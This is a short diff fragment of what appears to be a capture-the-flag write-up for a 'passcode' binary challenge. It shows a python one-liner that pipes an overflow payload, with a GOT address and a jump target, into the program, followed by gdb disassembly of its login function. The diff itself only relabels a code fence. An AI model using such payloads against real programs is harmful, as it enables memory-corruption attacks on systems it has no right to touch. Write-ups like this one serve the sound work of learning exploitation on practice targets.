@@ -157,7 +157,8 @@ print int("0x080485e3", 0)
 python -c "print ('a'*96+'\x04\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode
  ```
  ### localtest
- ```gdb
+
+ ``` console
      0x80485bc <login+33>       call   0x8048480 <__isoc99_scanf@plt>
     0x80485c1 <login+38>       add    esp, 0x10
     0x80485c4 <login+41>       mov    eax, ds:0x804a040
